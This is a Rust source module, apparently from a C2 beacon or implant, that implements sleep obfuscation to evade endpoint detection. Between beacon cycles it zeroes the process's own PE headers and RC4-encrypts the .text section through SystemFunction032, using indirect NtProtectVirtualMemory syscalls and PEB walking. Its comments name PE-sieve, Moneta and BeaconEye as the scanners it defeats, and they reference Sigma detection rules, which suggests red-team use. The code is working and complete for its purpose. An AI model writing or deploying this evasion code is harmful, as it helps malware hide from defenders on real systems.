//! Sleep obfuscation — two independent layers.
//!
//! Layer 1 (PE header zeroing): zero first 0x1000 bytes of own PE image during
//! sleep between beacon cycles. Defeats PE-sieve / Moneta / BeaconEye header scans.
//!
//! Layer 2 (RC4 .text encryption): encrypt the executable .text section via
//! SystemFunction032 (Advapi32 — undocumented RC4) before sleep, decrypt on wake.
//! Defeats PE-sieve private-commit scan and Moneta executable-page check.
//! Requires `new_current_thread()` tokio runtime to avoid worker threads executing
//! .text during the encryption window.
//!
//! Detection: detection/sigma/stealth_pe_header_zeroing.yml
//!            detection/sigma/evasion_ekko_text_encrypt.yml

#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
const HEADER_SIZE: usize = 0x1000;

#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
use core::ffi::c_void;
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
use core::sync::atomic::{AtomicBool, Ordering};
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
use dinvk::winapis::NT_SUCCESS;

#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
static HEADERS_ZEROED: AtomicBool = AtomicBool::new(false);
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
static mut SAVED_HEADERS: [u8; HEADER_SIZE] = [0u8; HEADER_SIZE];

/// Get own EXE base address: first entry in PEB InMemoryOrderModuleList.
/// For EXE processes, Windows loader always inserts the EXE as the first entry.
#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
unsafe fn own_pe_base() -> Option<*mut u8> {
    let peb: *const u8;
    core::arch::asm!(
        "mov {}, qword ptr gs:[0x60]",
        out(reg) peb,
        options(nostack, preserves_flags),
    );
    // PEB.Ldr at +0x18; InMemoryOrderModuleList.Flink at LDR+0x20
    let ldr = *(peb.add(0x18) as *const *const u8);
    let first = *(ldr.add(0x20) as *const *const u8);
    // IMO_DLLBASE_OFFSET = 0x20 (from InMemoryOrderLinks pointer, same as peb.rs)
    let base = *(first.add(0x20) as *const *const u8);
    if base.is_null() { None } else { Some(base as *mut u8) }
}

/// Zero PE headers in memory. Call before sleeping. Idempotent if already zeroed.
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
#[allow(static_mut_refs)]
pub unsafe fn zero_headers() {
    if HEADERS_ZEROED.load(Ordering::SeqCst) { return; }
    let base = match own_pe_base() { Some(b) => b, None => return };
    // Verify PE magic "MZ" (0x5A4D in little-endian: 'M'=0x4D, 'Z'=0x5A) before zeroing.
    if *(base as *const u16) != 0x5A4D { return; }
    // Save original bytes.
    core::ptr::copy_nonoverlapping(base, SAVED_HEADERS.as_mut_ptr(), HEADER_SIZE);
    // Make page writable via NtProtectVirtualMemory indirect syscall (same pattern as etw.rs).
    let mut rb = base as *mut c_void;
    let mut rs: usize = HEADER_SIZE;
    let mut old: u32 = 0;
    let st = dinvk::syscall!(
        "NtProtectVirtualMemory",
        dinvk::winapis::NtCurrentProcess(),
        &mut rb as *mut *mut c_void,
        &mut rs as *mut usize,
        0x40u32,  // PAGE_EXECUTE_READWRITE
        &mut old as *mut u32
    );
    if st.map(NT_SUCCESS) != Some(true) { return; }
    // Zero the header bytes.
    core::ptr::write_bytes(base, 0, HEADER_SIZE);
    // Restore page protection.
    let mut rb2 = base as *mut c_void;
    let mut rs2: usize = HEADER_SIZE;
    let mut dummy: u32 = 0;
    let _ = dinvk::syscall!(
        "NtProtectVirtualMemory",
        dinvk::winapis::NtCurrentProcess(),
        &mut rb2 as *mut *mut c_void,
        &mut rs2 as *mut usize,
        old,
        &mut dummy as *mut u32
    );
    HEADERS_ZEROED.store(true, Ordering::SeqCst);
}

/// Restore PE headers in memory. Call after waking. Idempotent if not zeroed.
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
#[allow(static_mut_refs)]
pub unsafe fn restore_headers() {
    if !HEADERS_ZEROED.load(Ordering::SeqCst) { return; }
    let base = match own_pe_base() { Some(b) => b, None => return };
    let mut rb = base as *mut c_void;
    let mut rs: usize = HEADER_SIZE;
    let mut old: u32 = 0;
    let st = dinvk::syscall!(
        "NtProtectVirtualMemory",
        dinvk::winapis::NtCurrentProcess(),
        &mut rb as *mut *mut c_void,
        &mut rs as *mut usize,
        0x40u32,
        &mut old as *mut u32
    );
    if st.map(NT_SUCCESS) != Some(true) { return; }
    core::ptr::copy_nonoverlapping(SAVED_HEADERS.as_ptr(), base, HEADER_SIZE);
    let mut rb2 = base as *mut c_void;
    let mut rs2: usize = HEADER_SIZE;
    let mut dummy: u32 = 0;
    let _ = dinvk::syscall!(
        "NtProtectVirtualMemory",
        dinvk::winapis::NtCurrentProcess(),
        &mut rb2 as *mut *mut c_void,
        &mut rs2 as *mut usize,
        old,
        &mut dummy as *mut u32
    );
    HEADERS_ZEROED.store(false, Ordering::SeqCst);
}

// =============================================================================
// RC4 .text section encryption (Layer 2)
// =============================================================================

/// SystemFunction032 (Advapi32.dll) data/key descriptor.
/// Identical layout to ANSI_STRING / PSTRING: DWORD Length, DWORD MaxLength, PVOID Buffer.
/// Used by Ekko and Cobalt Strike sleep mask.
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
#[repr(C)]
struct Sf032String {
    length: u32,
    max_length: u32,
    buffer: *mut u8,
}

#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
type Sf032Fn = unsafe extern "system" fn(*mut Sf032String, *mut Sf032String) -> i32;

#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
static mut RC4_KEY: [u8; 16] = [0u8; 16];
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
static RC4_KEY_INIT: AtomicBool = AtomicBool::new(false);
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
static TEXT_ENCRYPTED: AtomicBool = AtomicBool::new(false);

/// Parse IMAGE_SECTION_HEADER array from own PE, return VA + size of `.text` section.
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
unsafe fn find_text_section(base: *mut u8) -> Option<(*mut u8, usize)> {
    // e_lfanew at DOS header offset 0x3C
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let nt = base.add(e_lfanew);
    // Validate PE signature "PE\0\0"
    if *(nt as *const u32) != 0x0000_4550 { return None; }
    // NumberOfSections: FILE_HEADER + 2 bytes (Machine) + 2 bytes = offset 6 into NT headers
    let num_sections = *(nt.add(0x06) as *const u16) as usize;
    // SizeOfOptionalHeader: FILE_HEADER + 16 bytes = offset 20 into NT headers
    let opt_size = *(nt.add(0x14) as *const u16) as usize;
    // First IMAGE_SECTION_HEADER = NtHeaders + 4 (sig) + 20 (FileHeader) + SizeOfOptionalHeader
    let sections_start = nt.add(4 + 20 + opt_size);
    // Each IMAGE_SECTION_HEADER is 40 bytes; Name is first 8 bytes
    for i in 0..num_sections {
        let sec = sections_start.add(i * 40);
        let name = core::slice::from_raw_parts(sec, 8);
        if name == b".text\x00\x00\x00" {
            // VirtualSize at offset 8; VirtualAddress at offset 12
            let virt_size = *(sec.add(8) as *const u32) as usize;
            let virt_addr = *(sec.add(12) as *const u32) as usize;
            if virt_size == 0 || virt_addr == 0 { return None; }
            return Some((base.add(virt_addr), virt_size));
        }
    }
    None
}

/// Resolve SystemFunction032 from Advapi32.dll via PEB walk (no GetProcAddress).
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
unsafe fn resolve_sf032() -> Option<Sf032Fn> {
    let advapi = super::peb::find_module("Advapi32.dll")?;
    let va = super::peb::resolve_export(advapi, b"SystemFunction032")?;
    Some(core::mem::transmute(va))
}

/// Initialize a random 16-byte RC4 key on first call. Idempotent.
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
#[allow(static_mut_refs)]
unsafe fn init_rc4_key() {
    if RC4_KEY_INIT.load(Ordering::SeqCst) { return; }
    use rand::RngCore;
    rand::thread_rng().fill_bytes(&mut RC4_KEY);
    RC4_KEY_INIT.store(true, Ordering::SeqCst);
}

/// Apply RC4 to the given region via SystemFunction032. Key and data must be
/// non-null. RC4 is symmetric: calling twice restores the original bytes.
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
#[allow(static_mut_refs)]
unsafe fn rc4_region(sf032: Sf032Fn, data: *mut u8, data_len: usize) {
    let mut data_str = Sf032String {
        length:     data_len as u32,
        max_length: data_len as u32,
        buffer:     data,
    };
    let mut key_str = Sf032String {
        length:     RC4_KEY.len() as u32,
        max_length: RC4_KEY.len() as u32,
        buffer:     RC4_KEY.as_mut_ptr(),
    };
    let _ = sf032(&mut data_str, &mut key_str);
}

/// VirtualProtect the given region via NtProtectVirtualMemory indirect syscall.
/// Returns the old protection value, or None on failure.
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
unsafe fn vprotect(va: *mut u8, size: usize, new_prot: u32) -> Option<u32> {
    let mut rb = va as *mut c_void;
    let mut rs = size;
    let mut old: u32 = 0;
    let st = dinvk::syscall!(
        "NtProtectVirtualMemory",
        dinvk::winapis::NtCurrentProcess(),
        &mut rb as *mut *mut c_void,
        &mut rs as *mut usize,
        new_prot,
        &mut old as *mut u32
    );
    if st.map(NT_SUCCESS) == Some(true) { Some(old) } else { None }
}

/// RC4-encrypt the `.text` section before sleeping. Idempotent.
/// Safe only when called from a single-threaded tokio runtime (new_current_thread).
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
pub unsafe fn encrypt_text_section() {
    if TEXT_ENCRYPTED.load(Ordering::SeqCst) { return; }
    init_rc4_key();
    let sf032 = match resolve_sf032() { Some(f) => f, None => return };
    let base = match own_pe_base() { Some(b) => b, None => return };
    let (text_va, text_size) = match find_text_section(base) { Some(s) => s, None => return };
    let old = match vprotect(text_va, text_size, 0x04) { Some(p) => p, None => return }; // PAGE_READWRITE
    rc4_region(sf032, text_va, text_size);
    let _ = vprotect(text_va, text_size, old);
    TEXT_ENCRYPTED.store(true, Ordering::SeqCst);
}

/// RC4-decrypt the `.text` section after waking. Idempotent.
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
pub unsafe fn decrypt_text_section() {
    if !TEXT_ENCRYPTED.load(Ordering::SeqCst) { return; }
    let sf032 = match resolve_sf032() { Some(f) => f, None => return };
    let base = match own_pe_base() { Some(b) => b, None => return };
    let (text_va, text_size) = match find_text_section(base) { Some(s) => s, None => return };
    // Temporarily make .text writable while decrypting; executor is suspended at this point
    // (new_current_thread runtime — no other tokio thread executes .text during this window).
    let old = match vprotect(text_va, text_size, 0x40) { Some(p) => p, None => return }; // PAGE_EXECUTE_READWRITE
    rc4_region(sf032, text_va, text_size);
    let _ = vprotect(text_va, text_size, old);
    TEXT_ENCRYPTED.store(false, Ordering::SeqCst);
}

// No-op stubs for non-Windows/non-edr-evasion builds.
#[cfg(not(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion")))]
pub unsafe fn zero_headers() {}
#[cfg(not(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion")))]
pub unsafe fn restore_headers() {}
#[cfg(not(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion")))]
pub unsafe fn encrypt_text_section() {}
#[cfg(not(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion")))]
pub unsafe fn decrypt_text_section() {}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn header_size_covers_pe_header() {
        // header-zeroing uses first 0x1000 bytes — must cover DOS + NT headers
        assert!(0x1000 >= 0x400);
    }

    #[test]
    fn compiles_on_host() {
        // Runtime behavior tested on Windows target only.
        // This test confirms the module compiles without errors on Linux.
    }
}
